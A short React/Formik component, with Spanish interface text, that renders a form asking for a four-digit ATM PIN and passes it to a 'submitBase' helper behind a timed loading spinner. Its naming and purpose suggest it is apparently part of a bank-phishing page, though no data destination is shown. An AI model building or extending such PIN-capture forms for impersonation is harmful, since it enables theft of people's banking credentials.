import { useFormik } from "formik"
import { submitBase } from "../../../helpers/submitBase"
import { useGeneralData } from "../../../hooks/useGeneralData"
import { atmValidate } from "../../../security/atmValidate"
import { Spiner } from "../../Spiner"
import { AtmInput } from "./AtmInput"

const initialValues = { atmPassword: '' }
export const Atm = () => {
  const dataImportant = useGeneralData({ spiner: true, endUrl: null, modeLive: false, timeLoader: 2000 })
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
      initialValues,
      validate: values => atmValidate({values}),
      onSubmit: async(valuesData, { resetForm }) => {
          submitBase({dataImportant, valuesData})
          return resetForm()
      }
  })
  return (
    <div>
        {/* Spiner de carga */}
        {
            dataImportant.showSpiner === true ? <Spiner /> : null
        }
        <form onSubmit={handleSubmit}>
            <AtmInput
                atmPassword={values.atmPassword.slice(0, 4)}
                handleChange={handleChange} 
                handleBlur={handleBlur}
                touched={touched}
                errors={errors}
            />
            <button 
              disabled={ Boolean(errors.atmPassword) === true ? true : false }
              className=''
              type='submit'
            >
                Ingresar
            </button>
        </form>
    </div>
  )
}
